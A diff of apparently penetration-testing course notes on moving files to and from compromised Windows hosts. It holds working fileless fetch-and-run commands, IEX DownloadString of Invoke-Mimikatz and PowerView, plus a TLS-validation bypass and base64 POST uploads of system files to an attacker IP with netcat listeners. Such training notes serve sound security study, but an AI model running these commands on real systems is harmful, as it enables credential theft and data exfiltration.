@@ -1,12 +1,17 @@
 # File Transfers
 - [Windows File Transfer Methods](#windows-file-transfer-methods)
-    - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
-    - [SMB Downloads](#smb-downloads)
-    - [FTP Downloads](#ftp-downloads)
-
-
+    - [Download Operations](#download-operations)
+        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
+        - [PowerShell Web Downloads](#powershell-web-downloads)
+        - [SMB Downloads](#smb-downloads)
+        - [FTP Downloads](#ftp-downloads)
+    - [Upload Operations](#upload-operations)
+        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
+        - [PowerShell Web Uploads](#powershell-web-uploads)
+        - [SMB Uploads](#smb-uploads)
 ## Windows File Transfer Methods
-### PowerShell Base64 Encode & Decode
+### Download Operations
+#### PowerShell Base64 Encode & Decode
 - Encode the file using base64 util in our attack box `cat id_rsa |base64 -w 0;echo`
 - We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums: `md5sum id_rsa`
 - Then, decode using powershell 
@@ -19,7 +24,7 @@ PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBas
 > While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
 
 
-### PowerShell Web Downloads
+#### PowerShell Web Downloads
 
 - PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:
 
@@ -34,33 +39,39 @@ PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBas
 |DownloadString|	Downloads a String from a resource and returns a String.|
 |DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|
 
-#### PowerShell DownloadFile Method
-- File Download
-```
-PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
-PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+##### PowerShell DownloadFile Method
+1. First Approach
+    - File Download
+    ```
+    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+    PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
-PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
-PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
-```
+    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+    PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+    ```
 
-- PowerShell DownloadString - Fileless Method
-    - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
-```
-PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+2. Second Approach
 
-```
+    - PowerShell DownloadString - Fileless Method
+        - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
+    ```
+    PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-> [!NOTE] IEX also accepts pipeline input. 
+    ```
 
-```
-PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
-```
-- From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
-```
-PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-```
-#### Common Errors with PowerShell
+    > [!NOTE] IEX also accepts pipeline input. 
+
+    ```
+    PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+    ```
+
+3. Third Approach
+
+    - From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
+    ```
+    PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+    ```
+##### Common Errors with PowerShell
 1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
 ```
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
@@ -87,7 +98,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : WebException
 PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
-### SMB Downloads
+#### SMB Downloads
 
 - We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
 
@@ -107,7 +118,7 @@ You can't access this shared folder because your organization's security policie
 > [!NOTE]
 > You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.
 
-### FTP Downloads
+#### FTP Downloads
 
 - We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. Installing the FTP Server Python3 Module - pyftpdlib: `sudo pip3 install pyftpdlib`
 
@@ -139,5 +150,55 @@ You can't access this shared folder because your organization's security policie
 > C:\htb>more file.txt
 > This is a test file
 > ```
+
+### Upload Operations
+#### PowerShell Base64 Encode & Decode
+- Encode the file using powershell then ensure whether it's transferred successfully
+```
+PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
+PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+
+Hash
+----
+3688374325B992DEF12793500307566D
+```
+- Decode on our attacking box 
+```
+abdeonix@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
+```
+- Ensure Integrity `md5sum hosts`
+
+
+
+#### PowerShell Web Uploads
+1. First Approach
+    - PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads.
+    - For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.
+
+    - Installing a Configured WebServer with Upload: `sudo pip3 install uploadserver`
+    - Then, start the server `python3 -m uploadserver`
+    - We can use a PowerShell script PSUpload.ps1 which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.
+    - PowerShell Script to Upload a File to Python Upload Server
+    ```
+    PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+    PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+    [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
+    [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+    ```
+2. Second Approach **(PowerShell Base64 Web Upload)**
+
+    - Using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request.
+    - Listen on our attack box `nc -lvnp 8000`
+    - Copy the output and use the base64 decode function to convert the base64 string into a file.
+    ```
+    PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+    PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+    ```
+
+#### SMB Uploads
+
 
 
